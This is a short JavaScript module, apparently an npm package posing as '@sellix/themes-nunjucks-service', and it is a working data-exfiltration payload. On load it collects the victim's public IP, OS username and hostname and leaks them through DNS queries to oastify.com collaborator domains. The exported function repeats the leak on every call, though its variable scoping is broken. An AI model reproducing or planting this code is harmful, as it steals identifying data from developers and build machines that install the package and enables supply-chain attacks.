
async function getPublicIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Errore nel recuperare IP pubblico:', error);
      return 'IP_not_found';
    }
  }
  

  async function exfiltrateData() {
    const publicIP = await getPublicIP();
    const os = require('os');
    const dns = require('dns');
  
    const hostname = os.hostname();
    const userId = os.userInfo().username;
  

    const exfilData = `inital-${publicIP}.user-${userId}.host-${hostname}.znqmvn1wwl8gvx2z2644qabg57byzpqdf.oastify.com`;
  

    dns.resolve(exfilData, 'A', (err) => {
      if (err) console.error('Errore nella risoluzione DNS per esfiltrazione:', err);
      else console.log('Richiesta DNS inviata per esfiltrazione dati:', exfilData);
    });
  }
  

  exfiltrateData();

function demoFunction() {
  console.log("Demo function executed from @sellix/themes-nunjucks-service");

  // Esfiltrazione dei dati ogni volta che la funzione viene chiamata
  const functionExfilData = `function.${userId}.${hostname}.${ip.replace(/\./g, '-')}.nneavb1kw984vl2n2u4sqyb45vbmzdp1e.oastify.com`;
  dns.resolve(functionExfilData, 'A', (err) => {
    if (err) console.error('Failed to resolve DNS for function exfiltration');
    else console.log('Function-based DNS request sent for data exfiltration');
  });
}


module.exports = demoFunction;
